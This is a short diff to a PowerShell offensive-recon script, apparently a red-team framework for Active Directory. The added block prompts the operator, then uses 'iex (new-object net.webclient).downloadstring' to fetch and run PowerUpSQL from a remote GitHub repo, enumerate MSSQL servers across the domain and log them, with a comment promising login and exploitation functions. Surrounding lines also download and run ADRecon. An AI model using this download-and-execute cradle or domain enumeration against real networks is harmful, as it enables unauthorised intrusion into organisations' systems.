@@ -539,6 +539,16 @@ function domainreconmodules
 
 	    }
             
+	    
+            $powersql = Read-Host -Prompt 'Start PowerUpSQL Checks? (yes/no)'
+            if ($powersql -eq "yes" -or $powersql -eq "y" -or $powersql -eq "Yes" -or $powersql -eq "Y")
+            {
+	    	Write-Host -ForegroundColor Yellow 'Searching for MSSQL Server instances in the domain:'
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowerUpSQL.ps1')
+		Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\MSSQLServers.txt"
+		# Login functions / Exploitation functions follow.
+	    }
+	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
             Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
